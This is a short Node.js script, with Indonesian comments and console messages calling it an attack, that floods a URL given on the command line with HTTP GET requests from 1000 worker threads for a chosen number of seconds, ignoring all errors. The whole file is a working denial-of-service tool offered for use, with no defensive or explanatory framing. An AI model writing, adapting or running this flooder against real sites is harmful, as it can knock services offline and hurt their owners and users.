const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const axios = require('axios');
const url = process.argv[2];
const duration = process.argv[3];

if (isMainThread) {
    // Main thread: membuat worker threads
    const numThreads = 1000;
    const workers = [];

    console.log(`Memulai serangan ke ${url} selama ${duration} detik dengan ${numThreads} threads.`);

    for (let i = 0; i < numThreads; i++) {
        workers.push(new Worker(__filename, { workerData: { url } }));
    }

    // Set timeout untuk menghentikan serangan setelah duration detik
    setTimeout(() => {
        workers.forEach(worker => worker.terminate());
        console.log('Serangan dihentikan.');
        process.exit(0);
    }, duration * 1000);
} else {
    // Worker thread: melakukan request
    const targetUrl = workerData.url;

    async function attack() {
        while (true) {
            try {
                await axios.get(targetUrl, { timeout: 5000 });
            } catch (error) {
                // Abaikan error
            }
            // Delay 100ms
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }

    attack();
}